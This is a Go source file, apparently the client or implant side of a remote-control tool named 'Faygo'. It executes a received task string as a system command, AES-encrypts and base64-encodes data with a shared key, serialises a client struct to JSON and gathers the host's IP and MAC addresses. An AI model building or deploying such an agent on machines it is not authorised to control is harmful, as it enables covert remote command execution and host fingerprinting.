package main

import (
	cipher "Faygo/client/module/cipher"
	command "Faygo/client/module/command"
	getmac "Faygo/client/module/getmac"

	// http "Faygo/client/module/http"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
)

// 需要优化
// RunCommand func,指针赋值
func (c *Client) Runcommand() {
	_, out, err := command.NewCommand().Exec(c.Task)
	if err != nil {
		log.Panic(err)
	}
	c.Result = out
}

//JSON struct 转换

//Aes加解密
//
func AesEnCode(str string) string {
	bytestr := []byte(str)
	cryptstr, err := cipher.AesCbcEncrypt(bytestr, []byte(AesKey))
	if err != nil {
		fmt.Println(err)
		return "err"
	}
	return base64.StdEncoding.EncodeToString(cryptstr)
}

func AesDeCode(str string) string {
	bytestr, _ := base64.StdEncoding.DecodeString(str)
	//decoded, err := base64.StdEncoding.DecodeString(encoded)
	decryptstr, err := cipher.AesCbcDecrypt(bytestr, []byte(AesKey))
	if err != nil {
		fmt.Println(err)
		return "err"
	}
	return string(decryptstr)
}

//JSON Struct 转换
//
func Struct2Json(clientstruct Client) string {
	json, _ := json.Marshal(clientstruct) //字节流
	return string(json)
}

//此处用到 结构体的方法与接受者
func (client *Client) Json2Struct(clientjson string) {
	jsontmp := string(clientjson)
	json.Unmarshal([]byte(jsontmp), client)
}

//获取主机信息相关

func GetIP() string {
	return getmac.GetIPs()[0]
}

func GetMac() string {
	return getmac.GetMacAddrs()[0]
}
